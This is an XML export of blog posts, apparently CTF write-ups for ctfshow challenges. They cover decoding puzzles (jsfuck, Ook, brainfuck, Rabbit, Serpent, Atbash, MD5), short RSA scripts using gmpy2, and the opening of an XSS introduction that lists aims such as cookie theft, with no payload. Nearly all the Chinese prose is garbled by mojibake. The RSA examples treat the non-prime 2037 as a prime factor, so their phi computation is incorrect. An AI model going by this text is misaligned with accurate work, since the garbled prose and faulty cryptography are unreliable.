<p><strong>æç¤ºï¼š æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œæ ‡é¢˜å°±æ˜¯å¯†ç ï¼Ÿ</strong><br>è¯•äº†ä¸€ä¸‹base100è§£å¯†ï¼Œä¸è¡Œã€‚é‚£å°±æ˜¯<a href="https://txtmoji.com/">emojisè§£å¯†</a>ï¼Œéœ€è¦å¯†ç ï¼Œçœ‹é¢˜ç›®ï¼Œ0xä»£è¡¨åå…­è¿›åˆ¶è§£å¯†36då¾—åˆ°<strong>877</strong>ï¼ŒæˆåŠŸå¾—åˆ°flagã€‚</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-Crypto</title>
    <url>/2023/02/26/ctfshow-Crypto/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="jsfuckåŠ å¯†"><a href="#jsfuckåŠ å¯†" class="headerlink" title="jsfuckåŠ å¯†"></a>jsfuckåŠ å¯†</h2><p><strong>jsfuckåŠ å¯†</strong><br>æ‰“å¼€æ§åˆ¶å°ï¼Œå¤åˆ¶ç²˜è´´å›è½¦å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/9bf0f33ceb1f4c35a6b09386746ae59c.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/687b19df85a746f58df6d8da3f836637.png" alt="2"></p>
<h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>ä¸‹è½½åç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå¤åˆ¶ç²˜è´´åˆ°æ§åˆ¶å°ã€‚å¾—åˆ°flagã€‚</p>
<h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p><strong>å·²çŸ¥ p q e æ±‚ d</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
p <span class="token operator">=</span> <span class="token number">447685307</span>
q <span class="token operator">=</span> <span class="token number">2037</span>
e <span class="token operator">=</span> <span class="token number">17</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/64725cd54d814229a18167911ca6c9d6.png" alt="3"></p>
<h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p><img src="https://img-blog.csdnimg.cn/ae3ca93b1ac246b097cc59ba826eb835.png" alt="5"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># å·²çŸ¥(p, q, e,c)ï¼Œæ±‚mã€‚</span>
<span class="token keyword">import</span> gmpy2
p<span class="token operator">=</span><span class="token number">447685307</span>
q<span class="token operator">=</span><span class="token number">2037</span>
e<span class="token operator">=</span><span class="token number">17</span>
c<span class="token operator">=</span><span class="token number">704796792</span>

phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="rabbitè§£å¯†"><a href="#rabbitè§£å¯†" class="headerlink" title="rabbitè§£å¯†"></a>rabbitè§£å¯†</h2><p><img src="https://img-blog.csdnimg.cn/e94a5d5a735d43d880be0981bebbbbdc.png" alt="6"></p>
<p><a href="http://www.jsons.cn/rabbitencrypt/">rabbitè§£å¯†</a></p>
<h2 id="ookåŠ å¯†"><a href="#ookåŠ å¯†" class="headerlink" title="ookåŠ å¯†"></a>ookåŠ å¯†</h2><blockquote>
<p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?<br>Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook. Ook? Ook. </p>
</blockquote>
<p>çœ‹ä¸æ‡‚å•Šï¼ŸåŸæ¥æ˜¯<strong>ookåŠ å¯†</strong></p>
<p>è¿™æ˜¯ä¸€ç§å¾ˆä¸å¸¸è§çš„ç¼–ç Ookï¼</p>
<p>ä»€ä¹ˆé¬¼ï¼Ÿå°±æ˜¯ä¸€ç§ç¼–ç è€Œå·²<br>é€šè¿‡è¿™ä¸ªåœ°å€æˆ‘ä»¬å¯ä»¥å°†å…¶è§£ç <br>åœ°å€ï¼š<a href="https://tool.bugku.com/brainfuck/">Ookç¼–ç </a><br>ç‚¹å‡»Ookï¼to testå³å¯è§£å¯†</p>
<h2 id="brainfuckè§£å¯†"><a href="#brainfuckè§£å¯†" class="headerlink" title="brainfuckè§£å¯†"></a>brainfuckè§£å¯†</h2><blockquote>
<p>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;â€“ -&lt;]&gt;- -.+++ +++.&lt;<br>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;â€”- â€”-&lt; ]&gt;â€“. .â€“.- -.-.- â€“.-.<br>+++++ +..â€“ -..&lt;+ +++++ +[-&gt;+ +++++ +&lt;]&gt;+ +.&lt;++ ++++[ -&gt;â€” â€”&lt;] &gt;â€”-<br>â€”â€“ .â€”- -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +++++ +++.&lt; +++++ ++[-&gt; â€”â€“<br>â€“&lt;]&gt; .++.- â€”-. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;+++. â€“.&lt;+ +++++ [-&gt;â€“ â€”-&lt;<br>]&gt;â€” â€”â€“ â€”.+ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ +++++ [-&gt;â€“<br>â€”-&lt; ]&gt;â€” â€”â€“ â€”.- .++++ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++.&lt; +++++<br>+[-&gt;- â€”â€“ &lt;]&gt;â€“ â€”â€“ â€”.- â€”â€“ .++++ +++++ .â€”- â€”-. &lt;++++ ++[-&gt;<br>+++++ +&lt;]&gt;+ +++++ +++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;+ ++.&lt;</p>
</blockquote>
<p><a href="https://tool.bugku.com/brainfuck/">brainfuckè§£å¯†</a><br><img src="https://img-blog.csdnimg.cn/d37a3ee90d6c4dee8b78f144403eac70.png" alt="8"></p>
<h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæš´åŠ›ç ´è§£å¾—åˆ°å¯†ç ä¸º<strong>4132</strong><br>ä¸‹é¢æ²¡æ€è·¯äº†ï¼Œçœ‹äº†å¤§ä½¬çš„wpåŸæ¥æ˜¯<a href="https://blog.csdn.net/douqingl/article/details/50256931">Serpent </a><br><a href="http://serpent.online-domain-tools.com/">è§£å¯†ç½‘å€</a><br><img src="https://img-blog.csdnimg.cn/d78a4f4147ec43349d6241a756c8d818.png" alt="9"></p>
<h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><blockquote>
<p>&#x3D;E7&#x3D;94&#x3D;A8&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E7&#x3D;81&#x3D;AB&#x3D;E7&#x3D;83&#x3D;AD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E5&#x3D;98&#x3D;B4&#x3D;E5&#x3D;94&#x3D;87&#x3D;E8&#x3D;AE&#x3D;A9&#x3D;E6&#x3D;88&#x3D;91&#x3D;E5&#x3D;9C&#x3D;A8&#x3D;E5&#x3D;8D&#x3D;88&#x3D;E5&#x3D;A4&#x3D;9C&#x3D;E9&#x3D;87&#x3D;8C&#x3D;E6&#x3D;97&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;BD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E9&#x3D;94&#x3D;80&#x3D;E9&#x3D;AD&#x3D;82</p>
</blockquote>
<p>ç”¨**[éšæ³¢é€æµ]CTFç¼–ç å·¥å…·<strong>è§£å¯†å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/d702c6d9ecca46399271a62a0207cb31.png" alt="10"><br>flagä¸º</strong>flag{ç”¨ä½ é‚£ç«çƒ­çš„å˜´å”‡è®©æˆ‘åœ¨åˆå¤œé‡Œæ— å°½çš„é”€é­‚}</p>
<h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>ä¸€çœ‹å°±æ˜¯MD5åŠ å¯†<a href="https://www.somd5.com/">è§£å¯†</a></p>
<h2 id="åŸƒç‰¹å·´ä»€ç "><a href="#åŸƒç‰¹å·´ä»€ç " class="headerlink" title="åŸƒç‰¹å·´ä»€ç "></a>åŸƒç‰¹å·´ä»€ç </h2><blockquote>
<p>å¯†æ–‡ï¼šuozt{Zgyzhv_xlwv_uiln_xguhsld}</p>
</blockquote>
<blockquote>
<p>åŸƒç‰¹å·´ä»€ç ï¼ˆAtbash Cipherï¼‰å…¶å®å¯ä»¥è§†ä¸ºä¸‹é¢è¦ä»‹ç»çš„ç®€å•æ›¿æ¢å¯†ç çš„ç‰¹ä¾‹ï¼Œå…¶åŸç†ä¸ºï¼šå®ƒä½¿ç”¨å­—æ¯è¡¨ä¸­çš„æœ€åä¸€ä¸ªå­—æ¯ä»£è¡¨ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå€’æ•°ç¬¬äºŒä¸ªå­—æ¯ä»£è¡¨ç¬¬äºŒä¸ªå­—æ¯ã€‚åœ¨ç½—é©¬å­—æ¯è¡¨ä¸­ï¼Œå®ƒæ˜¯è¿™æ ·å‡ºç°çš„ï¼š<br> æ˜æ–‡ï¼šA B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br> å¯†æ–‡ï¼šZ Y X W V U T S R Q P O N M L K J I H G F E D C B A</p>
</blockquote>
<p>(åŸƒç‰¹å·´ä»€ç è§£å¯†)[<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]</a></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-xss</title>
    <url>/2023/02/26/ctfshow-xss/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<p><img src="https://img-blog.csdnimg.cn/bd7d0276dcd141c4ae556dde560fcab9.png" alt="1"></p>
<blockquote>
<p>å…³é”®è¯ï¼š</p>
<p> è·¨ç«™<br> è„šæœ¬ï¼ˆJavaScriptã€Javaã€ VBScriptã€ActiveXã€ Flash æˆ–è€… HTMLï¼‰<br> æ³¨å…¥<br> æ‰§è¡Œ</p>
</blockquote>
<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><h2 id="1-ä»€ä¹ˆæ˜¯-XSS-æ¼æ´"><a href="#1-ä»€ä¹ˆæ˜¯-XSS-æ¼æ´" class="headerlink" title="1. ä»€ä¹ˆæ˜¯ XSS æ¼æ´?"></a>1. ä»€ä¹ˆæ˜¯ XSS æ¼æ´?</h2><p>XSS æ”»å‡»ï¼šè·¨ç«™è„šæœ¬æ”»å‡»(Cross Site Scripting)ï¼Œä¸ºä¸å’Œ å‰ç«¯å±‚å æ ·å¼è¡¨(Cascading Style Sheets)CSS æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸º XSSã€‚</p>
<p>XSS(è·¨ç«™è„šæœ¬æ”»å‡»)æ˜¯æŒ‡æ¶æ„æ”»å‡»è€…å¾€ Web é¡µé¢é‡Œæ’å…¥æ¶æ„ Script ä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µæ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„ Script ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ç±»ä¼¼äº sql æ³¨å…¥ã€‚æ˜¯ç›®å‰æœ€æ™®éçš„ Web åº”ç”¨å®‰å…¨æ¼æ´ï¼Œä¹Ÿæ˜¯ Web æ”»å‡»ä¸­æœ€å¸¸è§çš„æ”»å‡»æ–¹å¼ä¹‹ä¸€ã€‚</p>
<p>XSSï¼ˆ è·¨ç«™è„šæœ¬æ”»å‡»ï¼‰æ”»å‡»é€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œé€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯ JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬ Javaã€ VBScriptã€ActiveXã€ Flash æˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„ HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°åŒ…æ‹¬ä½†ä¸é™äºæ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œ cookie ç­‰å„ç§å†…å®¹ã€‚</p>
<h2 id="2-XSS-æ¼æ´æ”»å‡»åŸç†åŠæ”»å‡»æ‰‹æ®µ"><a href="#2-XSS-æ¼æ´æ”»å‡»åŸç†åŠæ”»å‡»æ‰‹æ®µ" class="headerlink" title="2. XSS æ¼æ´æ”»å‡»åŸç†åŠæ”»å‡»æ‰‹æ®µ"></a>2. XSS æ¼æ´æ”»å‡»åŸç†åŠæ”»å‡»æ‰‹æ®µ</h2><p>HTML æ˜¯ä¸€ç§è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼Œé€šè¿‡å°†ä¸€äº›å­—ç¬¦ç‰¹æ®Šåœ°å¯¹å¾…æ¥åŒºåˆ«æ–‡æœ¬å’Œæ ‡è®°ï¼Œä¾‹å¦‚ï¼Œå°äºç¬¦å·ï¼ˆ&lt;ï¼‰è¢«çœ‹ä½œæ˜¯ HTML æ ‡ç­¾çš„å¼€å§‹ï¼Œä¹‹é—´çš„å­—ç¬¦æ˜¯é¡µé¢çš„æ ‡é¢˜ç­‰ç­‰ã€‚</p>
<p>å½“åŠ¨æ€é¡µé¢ä¸­æ’å…¥çš„å†…å®¹å«æœ‰è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚&lt;ï¼‰æ—¶ï¼Œç”¨æˆ·æµè§ˆå™¨ä¼šå°†å…¶è¯¯è®¤ä¸ºæ˜¯æ’å…¥äº† HTML æ ‡ç­¾ï¼Œå½“è¿™äº› HTML æ ‡ç­¾å¼•å…¥äº†ä¸€æ®µ JavaScript è„šæœ¬æ—¶ï¼Œè¿™äº›è„šæœ¬ç¨‹åºå°±å°†ä¼šåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚æ‰€ä»¥ï¼Œå½“è¿™äº›ç‰¹æ®Šå­—ç¬¦ä¸èƒ½è¢«åŠ¨æ€é¡µé¢æ£€æŸ¥æˆ–æ£€æŸ¥å‡ºç°å¤±è¯¯æ—¶ï¼Œå°±å°†ä¼šäº§ç”Ÿ XSS æ¼æ´ã€‚</p>
<blockquote>
<p>å¸¸ç”¨çš„ XSS æ”»å‡»æ‰‹æ®µå’Œç›®çš„æœ‰ï¼š</p>
<p>1ã€ç›—ç”¨ cookieï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p>2ã€åˆ©ç”¨æ¤å…¥ Flashï¼Œé€šè¿‡ crossdomain æƒé™è®¾ç½®è¿›ä¸€æ­¥è·å–æ›´é«˜æƒé™ï¼›æˆ–è€…åˆ©ç”¨ Java ç­‰å¾—åˆ°ç±»ä¼¼çš„æ“ä½œã€‚</p>
<p>3ã€åˆ©ç”¨ iframeã€frameã€XMLHttpRequest æˆ–ä¸Šè¿° Flash<br>ç­‰æ–¹å¼ï¼Œä»¥ï¼ˆè¢«æ”»å‡»ï¼‰ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œä¸€äº›ç®¡ç†åŠ¨ä½œï¼Œæˆ–æ‰§è¡Œä¸€äº›ä¸€èˆ¬çš„å¦‚å‘å¾®åšã€åŠ å¥½å‹ã€å‘ç§ä¿¡ç­‰æ“ä½œã€‚</p>
<p>4ã€åˆ©ç”¨å¯è¢«æ”»å‡»çš„åŸŸå—åˆ°å…¶ä»–åŸŸä¿¡ä»»çš„ç‰¹ç‚¹ï¼Œä»¥å—ä¿¡ä»»æ¥æºçš„èº«ä»½è¯·æ±‚ä¸€äº›å¹³æ—¶ä¸å…è®¸çš„æ“ä½œï¼Œå¦‚è¿›è¡Œä¸å½“çš„æŠ•ç¥¨æ´»åŠ¨ã€‚</p>
